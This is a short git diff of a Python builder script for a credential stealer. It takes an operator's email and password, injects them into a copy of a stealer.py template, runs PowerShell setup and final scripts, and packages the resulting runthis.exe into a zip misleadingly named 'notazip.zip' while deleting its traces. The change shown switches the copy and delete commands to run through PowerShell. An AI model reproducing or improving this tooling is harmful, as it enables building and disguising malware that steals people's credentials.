@@ -38,7 +38,7 @@ password = input("Enter your password >  ")
 def main():
     print("\nCreating file....")
 
-    subprocess.check_output("copy ./scripts/stealer.py this.py", shell=True)
+    subprocess.check_output("powershell -Command copy ./scripts/stealer.py this.py", shell=True)
 
     replaceFileContent("this.py", "testmail", mail)
     replaceFileContent("this.py", "testpass", password)
@@ -48,13 +48,13 @@ def main():
 
     subprocess.call("powershell ./scripts/setup.ps1")
 
-    subprocess.call("del /f this.py", shell=True)
+    subprocess.call("powershell -Command del /f this.py", shell=True)
 
     with ZipFile('notazip.zip', 'w') as myzip:
         myzip.write('runthis.exe')
-    subprocess.call("del /f runthis.exe", shell=True)
+    subprocess.call("powershell -Command del /f runthis.exe", shell=True)
     subprocess.call("powershell ./scripts/final.ps1", shell=True)
-    subprocess.call("del notazip.zip", shell=True)
+    subprocess.call("powershell -Command del notazip.zip", shell=True)
 
 if __name__ == "__main__":
    main()
